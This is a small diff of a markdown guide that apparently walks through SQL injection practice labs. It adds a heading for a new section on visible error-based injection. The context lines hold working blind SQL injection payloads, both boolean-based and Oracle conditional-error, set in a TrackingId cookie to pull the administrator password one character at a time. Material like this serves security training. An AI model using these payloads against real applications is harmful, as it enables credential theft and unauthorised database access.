@@ -182,6 +182,7 @@ Using Cluster Bomb payload for efficiency&speed for all the positions (1-20)(a-z
 Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--
 ```
 
+
 ## 11. Blind SQL injection with conditional errors(ORACLE)
 
 We will perform injection based on the session cookie (internal server error: positive response) 
@@ -230,3 +231,5 @@ Using Cluster Bomb payload for efficiency&speed for all the positions (1-20)(a-z
 Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN SUBSTR(password,§1§,1) = '§a§' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'-- 
 ```
 
+
+## 12.  Visible error-based SQL injection
